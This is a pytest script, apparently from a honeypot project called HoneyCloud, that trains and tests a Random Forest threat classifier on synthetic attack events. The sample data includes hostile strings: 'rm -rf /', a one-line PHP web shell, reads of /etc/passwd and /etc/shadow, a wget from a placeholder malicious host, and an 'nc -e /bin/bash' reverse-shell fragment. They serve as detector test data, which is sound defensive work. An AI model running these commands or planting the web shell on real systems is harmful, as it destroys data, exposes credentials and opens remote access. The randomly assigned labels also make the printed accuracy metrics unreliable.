"""
Test script for HoneyCloud ML Engine
Demonstrates Random Forest threat detection capabilities
"""
import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(__file__)))

import pytest
from app.ml_engine import ml_engine
from app.ml_trainer import ml_training_service
import asyncio
from datetime import datetime
import json

# Sample attack events for testing
SAMPLE_EVENTS = [
    {
        "service": "SSH",
        "source_ip": "192.168.1.100",
        "source_port": 22,
        "username": "root",
        "password": "123456",
        "command": "rm -rf /",
        "severity": "CRITICAL",
        "ai_label": "malicious",
        "threat_score": 0.95,
        "timestamp": "2024-01-15T10:30:00Z",
        "location": {"country": "Unknown", "city": "Unknown", "country_code": "XX"}
    },
    {
        "service": "HTTP",
        "source_ip": "10.0.0.50",
        "source_port": 80,
        "username": "admin",
        "password": "admin",
        "endpoint": "/wp-admin/admin.php",
        "method": "POST",
        "payload": "<?php system($_GET['cmd']); ?>",
        "severity": "HIGH",
        "ai_label": "malicious",
        "threat_score": 0.85,
        "timestamp": "2024-01-15T11:15:00Z",
        "location": {"country": "China", "city": "Beijing", "country_code": "CN"}
    },
    {
        "service": "FTP",
        "source_ip": "172.16.0.25",
        "source_port": 21,
        "username": "anonymous",
        "password": "guest@example.com",
        "command": "LIST",
        "severity": "LOW",
        "ai_label": "benign",
        "threat_score": 0.2,
        "timestamp": "2024-01-15T12:00:00Z",
        "location": {"country": "United States", "city": "New York", "country_code": "US"}
    },
    {
        "service": "SSH",
        "source_ip": "203.0.113.45",
        "source_port": 22,
        "username": "user",
        "password": "password123",
        "command": "ls -la",
        "severity": "MEDIUM",
        "ai_label": "anomaly",
        "threat_score": 0.6,
        "timestamp": "2024-01-15T13:30:00Z",
        "location": {"country": "Russia", "city": "Moscow", "country_code": "RU"}
    },
    {
        "service": "HTTP",
        "source_ip": "198.51.100.10",
        "source_port": 443,
        "username": "test",
        "password": "test123",
        "endpoint": "/api/users",
        "method": "GET",
        "severity": "LOW",
        "ai_label": "benign",
        "threat_score": 0.1,
        "timestamp": "2024-01-15T14:00:00Z",
        "location": {"country": "Germany", "city": "Berlin", "country_code": "DE"}
    }
]

def generate_more_sample_events(count=50):
    """Generate more sample events for training"""
    import random
    
    services = ["SSH", "HTTP", "FTP", "TELNET", "SMTP"]
    usernames = ["root", "admin", "user", "guest", "test", "anonymous"]
    commands = [
        "ls -la", "cat /etc/passwd", "rm -rf /", "wget malicious.com/script.sh",
        "nc -e /bin/bash", "python -c 'import os; os.system(\"id\")'",
        "help", "exit", "pwd", "whoami"
    ]
    endpoints = ["/admin", "/wp-admin", "/api/users", "/login", "/index.php", "/config"]
    severities = ["LOW", "MEDIUM", "HIGH", "CRITICAL"]
    ai_labels = ["benign", "anomaly", "malicious"]
    
    events = []
    for i in range(count):
        event = {
            "service": random.choice(services),
            "source_ip": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "source_port": random.randint(1, 65535),
            "username": random.choice(usernames),
            "password": f"pass{random.randint(1000,9999)}",
            "command": random.choice(commands),
            "endpoint": random.choice(endpoints),
            "method": random.choice(["GET", "POST", "PUT", "DELETE"]),
            "payload": "test payload" if random.random() > 0.5 else None,
            "severity": random.choice(severities),
            "ai_label": random.choice(ai_labels),
            "threat_score": random.uniform(0.0, 1.0),
            "timestamp": datetime.now().isoformat(),
            "location": {
                "country": random.choice(["US", "CN", "RU", "DE", "FR"]),
                "city": "Test City",
                "country_code": random.choice(["US", "CN", "RU", "DE", "FR"])
            }
        }
        events.append(event)
    
    return events

@pytest.mark.asyncio
async def test_ml_engine():
    """Test the ML engine functionality"""
    print("🤖 Testing HoneyCloud ML Engine with Random Forest")
    print("=" * 60)
    
    # Generate training data
    print("📊 Generating training data...")
    training_events = SAMPLE_EVENTS + generate_more_sample_events(100)
    print(f"✅ Generated {len(training_events)} training events")
    
    # Test feature extraction
    print("\n🔧 Testing feature extraction...")
    try:
        features_df = ml_engine.feature_extractor.extract_features(training_events[:5])
        print(f"✅ Extracted {len(features_df.columns)} features from {len(features_df)} events")
        print(f"📋 Feature columns: {list(features_df.columns)[:10]}...")
    except Exception as e:
        print(f"❌ Feature extraction failed: {e}")
        return
    
    # Train model
    print("\n🎯 Training Random Forest model...")
    try:
        metrics = ml_engine.train_model(training_events)
        print(f"✅ Model training completed!")
        print(f"📈 Accuracy: {metrics.accuracy:.3f}")
        print(f"📈 Precision: {metrics.precision:.3f}")
        print(f"📈 Recall: {metrics.recall:.3f}")
        print(f"📈 F1-Score: {metrics.f1_score:.3f}")
        print(f"📈 AUC Score: {metrics.auc_score:.3f}")
        print(f"🔢 Training samples: {metrics.training_samples}")
    except Exception as e:
        print(f"❌ Model training failed: {e}")
        return
    
    # Test predictions
    print("\n🔮 Testing predictions...")
    test_events = [
        {
            "service": "SSH",
            "source_ip": "192.168.1.200",
            "username": "root",
            "password": "toor",
            "command": "cat /etc/shadow",
            "severity": "HIGH",
            "timestamp": datetime.now().isoformat(),
            "location": {"country": "Unknown", "city": "Unknown", "country_code": "XX"}
        },
        {
            "service": "HTTP",
            "source_ip": "10.0.0.100",
            "username": "user",
            "endpoint": "/api/status",
            "method": "GET",
            "severity": "LOW",
            "timestamp": datetime.now().isoformat(),
            "location": {"country": "US", "city": "New York", "country_code": "US"}
        }
    ]
    
    for i, event in enumerate(test_events, 1):
        try:
            prediction = ml_engine.predict_threat(event)
            print(f"\n🎯 Test Event {i}:")
            print(f"   Service: {event['service']}")
            print(f"   Command: {event.get('command', event.get('endpoint', 'N/A'))}")
            print(f"   🤖 ML Prediction:")
            print(f"      Threat Level: {prediction.threat_level}")
            print(f"      Confidence: {prediction.confidence:.3f}")
            print(f"      Threat Probability: {prediction.threat_probability:.3f}")
            print(f"      Anomaly Score: {prediction.anomaly_score:.3f}")
            print(f"      Model Version: {prediction.model_version}")
        except Exception as e:
            print(f"❌ Prediction failed for event {i}: {e}")
    
    # Test batch predictions
    print("\n📦 Testing batch predictions...")
    try:
        batch_predictions = ml_engine.batch_predict(test_events)
        print(f"✅ Batch prediction completed for {len(batch_predictions)} events")
        
        threat_levels = [p.threat_level for p in batch_predictions]
        avg_confidence = sum(p.confidence for p in batch_predictions) / len(batch_predictions)
        print(f"📊 Threat levels: {threat_levels}")
        print(f"📊 Average confidence: {avg_confidence:.3f}")
    except Exception as e:
        print(f"❌ Batch prediction failed: {e}")
    
    # Test model info
    print("\n📋 Model Information:")
    model_info = ml_engine.get_model_info()
    for key, value in model_info.items():
        print(f"   {key}: {value}")
    
    print("\n🎉 ML Engine testing completed!")

@pytest.mark.asyncio
async def test_training_service():
    """Test the ML training service"""
    print("\n🔧 Testing ML Training Service")
    print("=" * 40)
    
    # Test training status
    print("📊 Getting training status...")
    try:
        status = ml_training_service.get_training_status()
        print("✅ Training status retrieved:")
        for key, value in status.items():
            print(f"   {key}: {value}")
    except Exception as e:
        print(f"❌ Failed to get training status: {e}")
    
    # Test incremental update
    print("\n🔄 Testing incremental model update...")
    try:
        new_events = generate_more_sample_events(10)
        success = await ml_training_service.update_model_incremental(new_events)
        print(f"✅ Incremental update: {'Success' if success else 'Skipped'}")
    except Exception as e:
        print(f"❌ Incremental update failed: {e}")

if __name__ == "__main__":
    print("🚀 Starting HoneyCloud ML Engine Tests")
    print("=" * 60)
    
    # Run tests
    asyncio.run(test_ml_engine())
    asyncio.run(test_training_service())
    
    print("\n✅ All tests completed!")
    print("🎯 Your Random Forest ML engine is ready for production!")